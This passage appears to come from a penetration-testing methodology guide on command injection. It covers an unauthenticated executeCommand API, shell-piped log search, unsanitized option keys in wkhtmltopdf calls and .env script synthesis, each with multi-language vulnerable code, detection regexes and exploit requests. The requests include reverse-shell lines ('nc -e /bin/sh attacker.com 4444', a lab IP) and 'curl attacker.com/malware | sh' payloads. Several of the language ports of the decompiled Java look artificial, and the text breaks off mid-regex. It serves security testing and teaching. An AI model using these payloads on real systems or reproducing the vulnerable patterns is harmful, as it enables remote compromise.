{% step %}
Check whether authentication is disabled for the target API in the configuration
{% endstep %}

{% step %}
Decompile the application files and search for the identified API
{% endstep %}

{% step %}
Review the paths, controllers, and `RequestMapping` definitions associated with the target API request (i.e., `executeCommand`), and verify in the source code that authentication is not enforced for this API

{% tabs %}
{% tab title="C#" %}
```csharp
using System;

[..]

[Controller("PoolController")]
[Route("/id-pools")]
[ResourceType("/rest/id-pools")]
[..]
```
{% endtab %}

{% tab title="Java" %}
```java
package com.hp.ci.mgmt.guidpools.controllers;

import [..]

@Controller("PoolController")
@RequestMapping({"/id-pools"})
@ResourceType("/rest/id-pools")
[..]
```
{% endtab %}

{% tab title="PHP" %}
```php
<?php

#[Controller("PoolController")]
#[RequestMapping(["/id-pools"])]
#[ResourceType("/rest/id-pools")]
[..]
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const [..] = require('[..]');

@Controller("PoolController")
@RequestMapping(["/id-pools"])
@ResourceType("/rest/id-pools")
[..]
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpPut]
[Route("/executeCommand")]
[ResponseStatus(HttpStatusCode.OK)]
[ResponseBody]
[DocAuthSpecial(SpecialAuthType.NO_AUTH)]
public ExecutableCommand ExecuteCommand(
    HttpRequest request,
    HttpResponse response,
    [FromBody] ExecutableCommand exeCmd,
    [FromHeader(Name = "If-None-Match")] string eTag,
    [FromHeader(Name = "accept-language")] string locale = "en_US",
    [FromHeader] string auth = null
)
{
    LOGGER.Info("Now executing the command {} as user trm7 ", new object[] { exeCmd.GetCmd() });

    bool ret = this.runtimeExecutor.Execute(exeCmd.GetCmd());

    LOGGER.Info("Completed executing the command {} as user trm7 and the status is {} ",
        new object[] { exeCmd.GetCmd(), ret });

    ExecutableCommand exe = new ExecutableCommand();
    exe.SetCmd(exeCmd.GetCmd());
    exe.SetResult(ret);

    return exe;
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RequestMapping(
        value = {"/executeCommand"},
        method = {RequestMethod.PUT}
    )
    @ResponseStatus(HttpStatus.OK)
    @ResponseBody
    @DocAuthSpecial(SpecialAuthType.NO_AUTH)
    public ExecutableCommand executeCommand(HttpServletRequest request, HttpServletResponse response, @RequestBody ExecutableCommand exeCmd, @RequestHeader(value = "If-None-Match",required = false) String eTag, @RequestHeader(value = "accept-language",defaultValue = "en_US") String locale, @RequestHeader(required = false) String auth) throws BaseException {
        LOGGER.info("Now executing the command {} as user trm7 ", new Object[]{exeCmd.getCmd()});
        boolean ret = this.runtimeExecutor.execute(exeCmd.getCmd());
        LOGGER.info("Completed executing the command {} as user trm7 and the status is {} ", new Object[]{exeCmd.getCmd(), ret});
        ExecutableCommand exe = new ExecutableCommand();
        exe.setCmd(exeCmd.getCmd());
        exe.setResult(ret);
        return exe;
    }
```
{% endtab %}

{% tab title="PHP" %}
```php
#[RequestMapping(
        value: ["/executeCommand"],
        method: [RequestMethod::PUT]
    )]
#[ResponseStatus(HttpStatus::OK)]
#[ResponseBody]
#[DocAuthSpecial(SpecialAuthType::NO_AUTH)]
public function executeCommand(
    HttpServletRequest $request,
    HttpServletResponse $response,
    #[RequestBody] ExecutableCommand $exeCmd,
    #[RequestHeader(value: "If-None-Match", required: false)] ?string $eTag,
    #[RequestHeader(value: "accept-language", defaultValue: "en_US")] string $locale,
    #[RequestHeader(required: false)] ?string $auth
): ExecutableCommand {
    LOGGER::info("Now executing the command {} as user trm7 ", [$exeCmd->getCmd()]);

    $ret = $this->runtimeExecutor->execute($exeCmd->getCmd());

    LOGGER::info(
        "Completed executing the command {} as user trm7 and the status is {} ",
        [$exeCmd->getCmd(), $ret]
    );

    $exe = new ExecutableCommand();
    $exe->setCmd($exeCmd->getCmd());
    $exe->setResult($ret);

    return $exe;
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
@RequestMapping({
        value: ["/executeCommand"],
        method: ["PUT"]
    })
@ResponseStatus("OK")
@ResponseBody
@DocAuthSpecial(SpecialAuthType.NO_AUTH)
function executeCommand(
    request,
    response,
    exeCmd,
    eTag,
    locale = "en_US",
    auth
) {
    LOGGER.info("Now executing the command {} as user trm7 ", [exeCmd.getCmd()]);

    const ret = this.runtimeExecutor.execute(exeCmd.getCmd());

    LOGGER.info(
        "Completed executing the command {} as user trm7 and the status is {} ",
        [exeCmd.getCmd(), ret]
    );

    const exe = new ExecutableCommand();
    exe.setCmd(exeCmd.getCmd());
    exe.setResult(ret);

    return exe;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
In the source code of this endpoint, determine whether system commands are used to execute or process user input

{% tabs %}
{% tab title="C#" %}
```csharp
using System;
using System.Diagnostics;
using System.Threading;

namespace com.hp.ci.mgmt.guidpools.service
{
    [Scope("singleton")]
    [Service("runtimeexecutor")]
    public class RuntimeExecutorService
    {
        private static readonly DebugLog LOGGER = new DebugLog("guid-app", typeof(RuntimeExecutorService));

        public RuntimeExecutorService()
        {
        }

        public bool Execute(string command)
        {
            try
            {
                Process process = Process.Start(command);

                Thread thread = new Thread(() =>
                {
                    try
                    {
                        process.WaitForExit();
                        int returnCode = process.ExitCode;
                        LOGGER.Info("Return code of command" + command + " = " + returnCode);
                    }
                    catch (ThreadInterruptedException exception)
                    {
                        LOGGER.Warn("InterruptedException while waiting for process", exception);
                        Thread.CurrentThread.Interrupt();
                    }
                });

                thread.Start();
                return true;
            }
            catch (System.IO.IOException exception)
            {
                LOGGER.Warn("Error while execution of command " + command, exception);
                return false;
            }
        }
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
package com.hp.ci.mgmt.guidpools.service;

import com.hp.ci.mgmt.logs.debug.DebugLog;
import java.io.IOException;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Service;

@Scope("singleton")
@Service("runtimeexecutor")
public class RuntimeExecutorService {
    private static final DebugLog LOGGER = new DebugLog("guid-app", RuntimeExecutorService.class);

    public RuntimeExecutorService() {
    }

    public boolean execute(final String command) {
        Runtime runtime = Runtime.getRuntime();

        try {
            final Process process = runtime.exec(command);
            Thread thread = new Thread() {
                public void run() {
                    try {
                        int returnCode = process.waitFor();
                        RuntimeExecutorService.LOGGER.info("Return code of command" + command + " = " + returnCode);
                    } catch (InterruptedException var2) {
                        InterruptedException exception = var2;
                        RuntimeExecutorService.LOGGER.warn("InterruptedException while waiting for process", exception);
                        Thread.currentThread().interrupt();
                    }

                }
            };
            thread.start();
            return true;
        } catch (IOException var5) {
            IOException exception = var5;
            LOGGER.warn("Error while execution of command " + command, exception);
            return false;
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
<?php

namespace com\hp\ci\mgmt\guidpools\service;

use com\hp\ci\mgmt\logs\debug\DebugLog;
use Exception;

#[Scope("singleton")]
#[Service("runtimeexecutor")]
class RuntimeExecutorService
{
    private static DebugLog $LOGGER;

    public function __construct()
    {
    }

    public function execute(string $command): bool
    {
        try {
            $process = proc_open($command, [], $pipes);

            $thread = function () use ($process, $command) {
                try {
                    $returnCode = proc_close($process);
                    RuntimeExecutorService::$LOGGER->info(
                        "Return code of command" . $command . " = " . $returnCode
                    );
                } catch (Exception $exception) {
                    RuntimeExecutorService::$LOGGER->warn(
                        "InterruptedException while waiting for process",
                        $exception
                    );
                }
            };

            $thread();
            return true;
        } catch (Exception $exception) {
            self::$LOGGER->warn(
                "Error while execution of command " . $command,
                $exception
            );
            return false;
        }
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const DebugLog = require('com/hp/ci/mgmt/logs/debug/DebugLog');

@Scope("singleton")
@Service("runtimeexecutor")
class RuntimeExecutorService {
    static LOGGER = new DebugLog("guid-app", RuntimeExecutorService);

    constructor() {
    }

    execute(command) {
        const { exec } = require('child_process');

        try {
            const process = exec(command);

            const thread = async () => {
                try {
                    process.on('exit', (returnCode) => {
                        RuntimeExecutorService.LOGGER.info(
                            "Return code of command" + command + " = " + returnCode
                        );
                    });
                } catch (exception) {
                    RuntimeExecutorService.LOGGER.warn(
                        "InterruptedException while waiting for process",
                        exception
                    );
                }
            };

            thread();
            return true;
        } catch (exception) {
            RuntimeExecutorService.LOGGER.warn(
                "Error while execution of command " + command,
                exception
            );
            return false;
        }
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Send a request to the target API with a JSON body containing system command values and obtain access

```http
PUT /rest/id-pools/executeCommand HTTP/1.1
Host: 192.168.181.132
accept-language: en_US
X-API-Version: 3800
Content-Type: application/json
Content-Length: 61

{
"cmd":"nc -e /bin/sh 192.168.181.129 1337",
"result":0
}
```
{% endstep %}
{% endstepper %}

***

#### Command Injection via Shell Pipelining Optimization in Distributed Log Aggregation

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on administrative observability dashboards, SIEM (Security Information and Event Management) integrations, or internal tools that allow users to search, filter, or export massive system logs
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Log Streaming" architecture. In distributed environments, querying gigabytes of flat-file logs (like Nginx access logs or application debug files) directly into application memory (e.g., using `File.ReadAllLines` or `fs.readFileSync`) instantly triggers Out-Of-Memory (OOM) exceptions and crashes the backend pod
{% endstep %}

{% step %}
Investigate the memory-management optimization: To avoid pulling the entire file into the application's heap, the developer delegates the filtering process directly to the underlying Operating System. The backend utilizes native OS streaming binaries (e.g., `tail`, `grep`, `awk`) to filter the text at the disk level before streaming the highly reduced result set over the network
{% endstep %}

{% step %}
Analyze the execution context in the decompiled code. Because the developer needs to chain multiple native commands together (e.g., fetching the last 1000 lines _and_ filtering by a specific regex), they must utilize the OS pipe operator `|`
{% endstep %}

{% step %}
Understand the fatal architectural requirement: The standard, secure execution APIs (like `ProcessStartInfo.ArgumentList` or `child_process.execFile`), which safely tokenize arguments and prevent command injection, inherently _do not support_ shell pipe operators. To make the pipe `|` function, the developer is forced to execute the command within a raw shell environment (e.g., `/bin/sh -c "tail -n 1000 app.log | grep -E '{userRegex}'"`)
{% endstep %}

{% step %}
Discover the trust assumption: The developer assumes that wrapping the interpolated `userRegex` variable inside single quotes (`'`) within the shell string acts as an impenetrable execution boundary, confining the input strictly to the `grep` argument space
{% endstep %}

{% step %}
Formulate the execution breakout payload. The attacker must supply an input that explicitly closes the developer's single quote, terminates the active `grep` command with a semicolon `;` or operator `&&`, initiates a new arbitrary system command, and neutralizes any trailing quotes left by the developer
{% endstep %}

{% step %}
Payload structure: `'.*'; {malicious_command}; echo '`
{% endstep %}

{% step %}
Authenticate to the observability dashboard as a low-privilege auditor or support technician
{% endstep %}

{% step %}
Submit a log search request containing the breakout payload in the regex filter field
{% endstep %}

{% step %}
The backend interpolates the payload into the raw shell string and invokes `/bin/sh`
{% endstep %}

{% step %}
The Bourne shell evaluates the string sequentially. It executes the `tail` and `grep` commands, encounters the injected command separator, breaks out of the intended execution path, and executes the attacker's OS command with the privileges of the backend application worker

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Process\.Start\s*\(\s*new\s+ProcessStartInfo[\s\S]{0,200}(?:FileName\s*=\s*["']\/bin\/(?:sh|bash)|Arguments\s*=).*\|.*grep|Process\.Start\s*\(.*\+.*\))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Runtime\.getRuntime\(\)\.exec\s*\(\s*new\s+String\[\]\s*\{[\s\S]{0,200}["']\/bin\/(?:sh|bash)["'].*\|.*grep|ProcessBuilder\s*\(.*\|.*)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:shell_exec\s*\(\s*["']tail.*\|.*grep|exec\s*\(\s*`tail.*\|.*grep|system\s*\(.*\|.*grep|passthru\s*\(.*\|.*)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:exec\s*\(\s*`tail.*\|.*grep|spawn\s*\(\s*["']\/bin\/(?:sh|bash)|child_process\.exec\s*\(.*\|.*grep)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Process\.Start\(new\s+ProcessStartInfo.*FileName\s*=\s*["']\/bin\/(sh|bash)["'].*\|.*grep
```
{% endtab %}

{% tab title="Java" %}
```regexp
Runtime\.getRuntime\(\)\.exec\(new\s+String\[\].*["']\/bin\/(sh|bash)["'].*\|.*grep
```
{% endtab %}

{% tab title="PHP" %}
```regexp
shell_exec\("tail.*\|.*grep|exec\(`tail.*\|.*grep
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
exec\(`tail.*\|.*grep|child_process\.exec\(.*\|.*grep
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TelemetryStreamService 
{
    public async Task<string> SearchLiveLogsAsync(string containerId, string regexFilter) 
    {
        // [1]
        // [2]
        var rawShellCommand = $"tail -n 5000 /var/logs/containers/{containerId}.log | grep -E '{regexFilter}'";

        // [3]
        var processInfo = new ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = $"-c \"{rawShellCommand}\"",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        // [4]
        using var process = Process.Start(processInfo);
        using var reader = process.StandardOutput;
        
        return await reader.ReadToEndAsync();
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class TelemetryStreamService {

    public String searchLiveLogs(String containerId, String regexFilter) throws Exception {
        // [1]
        // [2]
        String rawShellCommand = "tail -n 5000 /var/logs/containers/" + containerId + ".log | grep -E '" + regexFilter + "'";

        // [3]
        String[] cmd = {
            "/bin/sh",
            "-c",
            rawShellCommand
        };

        // [4]
        Process process = Runtime.getRuntime().exec(cmd);
        
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            return reader.lines().collect(Collectors.joining("\n"));
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TelemetryStreamService 
{
    public function searchLiveLogs(string $containerId, string $regexFilter): string 
    {
        // [1]
        // [2]
        // [3]
        $rawShellCommand = "tail -n 5000 /var/logs/containers/{$containerId}.log | grep -E '{$regexFilter}'";

        // [4]
        // shell_exec intrinsically spawns a subshell (/bin/sh -c)
        $output = shell_exec($rawShellCommand);

        return $output ?: '';
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TelemetryStreamService {
    static async searchLiveLogs(containerId, regexFilter) {
        // [1]
        // [2]
        let rawShellCommand = `tail -n 5000 /var/logs/containers/${containerId}.log | grep -E '${regexFilter}'`;

        // [3]
        // [4]
        // child_process.exec invokes a shell by default, unlike execFile
        return new Promise((resolve, reject) => {
            exec(rawShellCommand, (error, stdout, stderr) => {
                if (error && error.code !== 1) { // grep returns 1 on no match
                    return reject(error);
                }
                resolve(stdout);
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] To handle multi-gigabyte log files efficiently, the developer defers the text processing workload directly to the OS kernel utilizing native streaming binaries (`tail` and `grep`), \[2] The backend requires chaining the commands to limit the working set _before_ applying the expensive regex evaluation, necessitating the use of the shell pipe `|` operator, \[3] Because pipe operators are features of the shell interpreter and not the OS execution API, the developer is forced to wrap the entire command within a raw `/bin/sh -c` execution block, bypassing array-based argument tokenization, \[4] The developer attempts to sandbox the user's regex filter by wrapping it in single quotes. However, because the overarching execution context is a raw shell string, an attacker can simply inject an unmatched single quote to prematurely terminate the `grep` argument, inject a command terminator (`;`), and achieve unrestricted Command Injection on the host operating system

```http
// 1. Attacker (Auditor) accesses the Log Aggregation dashboard.
// 2. Attacker crafts a regex payload that breaks out of the single quotes and executes a reverse shell.
POST /api/v1/telemetry/search HTTP/1.1
Host: ops.enterprise.tld
Authorization: Bearer <auditor_token>
Content-Type: application/json

{
  "containerId": "auth-service-node-1",
  "regexFilter": "ERROR.*'; nc -e /bin/sh attacker.com 4444; echo '"
}

// 3. The Backend constructs the raw shell string:
// tail -n 5000 /var/logs/containers/auth-service-node-1.log | grep -E 'ERROR.*'; nc -e /bin/sh attacker.com 4444; echo ''

// 4. The OS executes the tail command, evaluates the grep command, moves to the injected 'nc' command, 
// establishes the reverse TCP connection to the attacker, and echoes the trailing quote to prevent syntax errors.
```
{% endstep %}

{% step %}
To support complex log aggregation without exceeding JVM/V8 memory limits, the enterprise architected a pipeline that leveraged native OS binaries. The requirement to pipe the output of one binary into another compelled the developers to execute the operation within a raw shell environment (`/bin/sh -c`). The developers assumed that structurally enclosing the user's input within single quotes would neutralize execution operators. The attacker exploited this string-building paradigm by injecting a closing quote, effectively stepping out of the `grep` argument boundaries and re-entering the executable shell scope. The host operating system evaluated the injected command terminator and executed the subsequent payload, seamlessly pivoting a read-only observability feature into full Remote Code Execution on the telemetry ingestion nodes
{% endstep %}
{% endstepper %}

***

#### Command Injection via Dynamic Flag Flattening in Headless Renders

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on export features, asynchronous reporting, or media transcoding pipelines (`Export to PDF`, `Generate Invoice`, `Convert Video`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a headless binary execution architecture. To render complex HTML into pixel-perfect PDFs, or to transcode media formats, the backend invokes highly optimized native binaries (`wkhtmltopdf`, `ffmpeg`, `pandoc`)
{% endstep %}

{% step %}
Investigate the "Extensibility" optimization. Native binaries like `wkhtmltopdf` or `ffmpeg` possess hundreds of esoteric command-line flags (e.g., `--margin-top`, `--javascript-delay`, `--video-filter`). Updating the API's Data Transfer Objects (DTOs) and backend mapping logic every time a user requests a new feature is an unscalable engineering burden
{% endstep %}

{% step %}
Discover the dynamic argument flattening shortcut: To provide absolute flexibility, the API accepts a free-form dictionary of `customOptions` (e.g., `{"margin-top": "10mm", "grayscale": ""}`). The backend iterates over this dictionary and dynamically concatenates the keys and values into the final OS command string
{% endstep %}

{% step %}
Analyze the execution sink. Notice that the developer rigorously sanitizes and quotes the _Values_ of the dictionary to prevent injection
{% endstep %}

{% step %}
Understand the hidden trust assumption: The developer explicitly assumes that the _Keys_ of a JSON object (the property names) are intrinsically safe, structural identifiers controlled by the frontend application. They fail to apply any sanitization, escaping, or whitelisting to the dictionary Keys
{% endstep %}

{% step %}
Recognize the shell evaluation boundary. Even if the application attempts to use a secure execution method (like an array-based argument list), the fundamental structural injection allows the attacker to pass arbitrary new flags to the native binary. In many cases, to support complex output redirection, the developer builds a single raw string and passes it to `cmd.exe` or `/bin/sh`
{% endstep %}

{% step %}
Formulate the key-based injection payload. Create an API request where the JSON Key contains the execution breakout syntax
{% endstep %}

{% step %}
Payload structure: `{"--margin-top 10; curl [attacker.com/malware](https://attacker.com/malware) | sh; #": "dummy_value"}`
{% endstep %}

{% step %}
The backend receives the JSON object. It iterates over the keys. It securely quotes the value (`"dummy_value"`), but prepends the raw, unescaped malicious Key directly into the command string
{% endstep %}

{% step %}
The resulting shell string becomes: `wkhtmltopdf ----margin-top 10; curl [attacker.com/malware](https://attacker.com/malware) | sh; # "dummy_value" input.html output.pdf`
{% endstep %}

{% step %}
The shell interprets the first command, hits the injected semicolon, and detonates the secondary command payload on the host system

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:foreach\s*\(\s*var\s+\w+\s+in\s+customOptions\s*\).*command\s*\+=\s*\$".*--\{.*\}|foreach\s*\(\s*(?:var|KeyValuePair).*\s+in\s+.*Options.*\).*Process\.Start|command\s*\+=\s*.*\{.*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:for\s*\(\s*Map\.Entry<.*>\s+\w+\s*:\s*customOptions\.entrySet\(\)\).*cmd\.append\s*\(\s*"--"\s*\+\s*\w+\.getKey\(\)|StringBuilder.*append\s*\(\s*"--"|ProcessBuilder\s*\(.*customOptions)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:foreach\s*\(\s*\$customOptions\s+as\s+\$key\s*=>|foreach\s*\(\s*\$.*Options.*=>.*\).*['"]--|shell_exec\s*\(.*\$key|exec\s*\(.*\$key)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:Object\.keys\s*\(\s*customOptions\s*\)\.forEach\s*\(\s*key\s*=>.*cmd\s*\+=\s*`.*--\$\{key\}|Object\.entries\s*\(.*Options.*\).*spawn|exec\s*\(.*\$\{key\})
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
foreach\s*\(var\s+\w+\s+in\s+customOptions\)\s*\{\s*command\s*\+=\s*\\\$".*--\{
```
{% endtab %}

{% tab title="Java" %}
```regexp
for\s*\(Map\.Entry<.*>\s+\w+\s*:\s*customOptions\.entrySet\(\)\)\s*\{\s*cmd\.append\("\s*--"\s*\+\s*\w+\.getKey\(\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
foreach\s*\(\\\$customOptions\s+as\s+\\\$key\s*=>
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
Object\.keys\(customOptions\)\.forEach\(key\s*=>\s*\{\s*cmd\s*\+=\s*`\s*--\\\$\\{key\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class PdfRenderingService 
{
    public async Task<byte[]> RenderDocumentAsync(string htmlContent, Dictionary<string, string> customOptions) 
    {
        var inputPath = Path.GetTempFileName() + ".html";
        var outputPath = Path.GetTempFileName() + ".pdf";
        await File.WriteAllTextAsync(inputPath, htmlContent);

        // [1]
        // [2]
        var commandBuilder = new StringBuilder("wkhtmltopdf --quiet");

        // [3]
        if (customOptions != null) 
        {
            foreach (var option in customOptions) 
            {
                // [4]
                commandBuilder.Append($" --{option.Key} \"{EscapeShellArg(option.Value)}\"");
            }
        }

        commandBuilder.Append($" {inputPath} {outputPath}");

        var processInfo = new ProcessStartInfo
        {
            FileName = "/bin/sh",
            Arguments = $"-c \"{commandBuilder.ToString()}\"",
            RedirectStandardOutput = true,
            UseShellExecute = false
        };

        using var process = Process.Start(processInfo);
        await process.WaitForExitAsync();

        return await File.ReadAllBytesAsync(outputPath);
    }

    private string EscapeShellArg(string arg) => arg.Replace("\"", "\\\"");
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class PdfRenderingService {

    public byte[] renderDocument(String htmlContent, Map<String, String> customOptions) throws Exception {
        File inputFile = File.createTempFile("input", ".html");
        File outputFile = File.createTempFile("output", ".pdf");
        Files.write(inputFile.toPath(), htmlContent.getBytes());

        // [1]
        // [2]
        StringBuilder cmd = new StringBuilder("wkhtmltopdf --quiet");

        // [3]
        if (customOptions != null) {
            for (Map.Entry<String, String> option : customOptions.entrySet()) {
                // [4]
                cmd.append(" --").append(option.getKey()).append(" \"").append(escapeShellArg(option.getValue())).append("\"");
            }
        }

        cmd.append(" ").append(inputFile.getAbsolutePath()).append(" ").append(outputFile.getAbsolutePath());

        String[] shellCmd = { "/bin/sh", "-c", cmd.toString() };
        Process process = Runtime.getRuntime().exec(shellCmd);
        process.waitFor();

        return Files.readAllBytes(outputFile.toPath());
    }

    private String escapeShellArg(String arg) { return arg.replace("\"", "\\\""); }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class PdfRenderingService 
{
    public function renderDocument(string $htmlContent, array $customOptions): string 
    {
        $inputPath = tempnam(sys_get_temp_dir(), 'html');
        $outputPath = tempnam(sys_get_temp_dir(), 'pdf');
        file_put_contents($inputPath, $htmlContent);

        // [1]
        // [2]
        $cmd = "wkhtmltopdf --quiet";

        // [3]
        if (!empty($customOptions)) 
        {
            foreach ($customOptions as $key => $value) 
            {
                // [4]
                $cmd .= " --{$key} " . escapeshellarg($value);
            }
        }

        $cmd .= " {$inputPath} {$outputPath}";

        shell_exec($cmd);

        return file_get_contents($outputPath);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class PdfRenderingService {
    static async renderDocument(htmlContent, customOptions) {
        const inputPath = `/tmp/${crypto.randomUUID()}.html`;
        const outputPath = `/tmp/${crypto.randomUUID()}.pdf`;
        fs.writeFileSync(inputPath, htmlContent);

        // [1]
        // [2]
        let cmd = `wkhtmltopdf --quiet`;

        // [3]
        if (customOptions) {
            Object.keys(customOptions).forEach(key => {
                // [4]
                let safeValue = customOptions[key].replace(/"/g, '\\"');
                cmd += ` --${key} "${safeValue}"`;
            });
        }

        cmd += ` ${inputPath} ${outputPath}`;

        return new Promise((resolve, reject) => {
            exec(cmd, (error) => {
                if (error) return reject(error);
                resolve(fs.readFileSync(outputPath));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The microservice utilizes a powerful headless binary (like `wkhtmltopdf`) to generate pixel-perfect PDF documents from HTML, \[2] To compile the command line, the developer relies on building a single raw string, which is later dispatched to the operating system's native shell evaluator, \[3] To support future business requirements without modifying backend data structures, the endpoint accepts a dynamic dictionary of rendering configuration flags, \[4] The asymmetric sanitization failure. The developer applies strict escaping functions (`escapeshellarg`, `Replace`) exclusively to the dictionary _values_. They implicitly trust the dictionary _keys_, concatenating them directly into the shell string. An attacker exploits this by transferring their injection payload out of the heavily sanitized Value string and embedding it directly into the unsanitized Key string

```http
// 1. Attacker interacts with the PDF export module.
// 2. Attacker crafts a JSON payload where the injection vector is hidden entirely within the Object Key.
POST /api/v1/reports/export-pdf HTTP/1.1
Host: report-service.enterprise.tld
Authorization: Bearer <low_privilege_token>
Content-Type: application/json

{
  "htmlContent": "<h1>Quarterly Report</h1>",
  "customOptions": {
    "margin-top 10; nc -e /bin/sh attacker.com 4444; #": "dummy_value"
  }
}

// 3. The Backend iterates over the options. It escapes "dummy_value" safely.
// 4. It concatenates the raw Key into the shell command string:
// wkhtmltopdf --quiet --margin-top 10; nc -e /bin/sh attacker.com 4444; # "dummy_value" /tmp/input.html /tmp/output.pdf

// 5. The OS shell executes wkhtmltopdf, encounters the semicolon, and spawns the reverse shell.
// The '#' character comments out the rest of the string to ensure the payload doesn't throw syntax errors.
```
{% endstep %}

{% step %}
To ensure the PDF generation microservice could rapidly adapt to new UI requirements, developers implemented a dynamic argument builder that mapped JSON dictionaries directly to command-line execution flags. The security architecture focused entirely on sanitizing the content of the parameters (the Values), while implicitly trusting the structure of the payload (the Keys). The attacker inverted this trust model by encapsulating the execution breakout sequence inside the JSON property name. When the backend iterated over the dictionary, it successfully sanitized the inert value but injected the poisoned key directly into the raw OS shell string. The shell interpreted the injected key as a structural command separator, executing the injected system binaries and exposing the backend rendering pod to total remote compromise
{% endstep %}
{% endstepper %}

***

#### RCE via DotEnv Shell Synthesis in Ephemeral Container Orchestration

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on Serverless functions, CI/CD runners, or Multi-Tenant Cloud Provisioning features where the application spins up isolated, ephemeral execution environments (executing a user's script inside a Docker container or spinning up a dedicated tenant database pod)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Configuration Injection" architecture. When the orchestration microservice provisions the ephemeral container, it must securely inject tenant-specific credentials, tokens, or custom runtime settings into the container
{% endstep %}

{% step %}
Investigate the security optimization: Passing API keys or database passwords via Docker/Kubernetes CLI arguments (e.g., `docker run --env SECRET=XYZ`) is highly dangerous because the secrets are logged in plaintext within the host's `/var/log/syslog` and are visible via the `ps aux` command
{% endstep %}

{% step %}
Discover the "DotEnv Synthesis" workaround. To safely transport secrets into the container without exposing them to process monitoring tools, the orchestration service dynamically writes a temporary `.env` shell script to the host's disk (e.g., `/tmp/tenant_99.env`). The container's entrypoint script then securely loads these variables by sourcing the file (`source /tmp/tenant_99.env && execute_task`)
{% endstep %}

{% step %}
Analyze the logic that generates this `.env` file within the orchestration backend. The backend receives a JSON dictionary of `CustomSettings` from the user's provisioning request
{% endstep %}

{% step %}
Observe the iteration loop. The backend writes the environment variables to the shell file using the standard export syntax: `export {Key}="{Escaped_Value}"\n`
{% endstep %}

{% step %}
Recognize the critical execution sink. The `.env` file is not a passive configuration file; it is an executable shell script that is evaluated by the Bash/Sh interpreter when the container `source`s it
{% endstep %}

{% step %}
Discover the trust assumption: The backend developer rigorously shell-escapes the _Values_ but explicitly trusts the dictionary _Keys_, assuming they are strictly alphanumeric configuration identifiers
{% endstep %}

{% step %}
Formulate the script breakout payload. You must supply a JSON Key that breaks the `export` statement syntax, injects an arbitrary OS command, and cleanly initiates the next `export` to prevent syntax failures
{% endstep %}

{% step %}
Payload structure: `DUMMY="1"; curl [attacker.com/malware](https://attacker.com/malware) | sh; export INJECTED`
{% endstep %}

{% step %}
Authenticate to the cloud provisioning portal and initiate a deployment
{% endstep %}

{% step %}
Submit the malicious Key within your Custom Configuration settings
{% endstep %}

{% step %}
The orchestration backend synthesizes the `.env` script on the underlying host node, appending your unescaped Key to the file. When the container initializes and executes `source /tmp/tenant_99.env`, the shell evaluates your injected command. The RCE occurs seamlessly during the container bootstrap phase, often executing within the orchestration node's context if the file is sourced prior to strict namespace isolation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:File\.WriteAllTextAsync\s*\([^,]+,\s*\$"export\s+\{.*\}|File\.WriteAllText\s*\([^,]+,\s*\$".*\{.*\})
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:Files\.writeString\s*\([^,]+,\s*"export\s+"\s*\+\s*\w+|Files\.write\s*\([^,]+,.*\+.*\w+\))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:file_put_contents\s*\([^,]+,\s*"export\s+\{\$.*\}|file_put_contents\s*\([^,]+,.*\$.*\))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
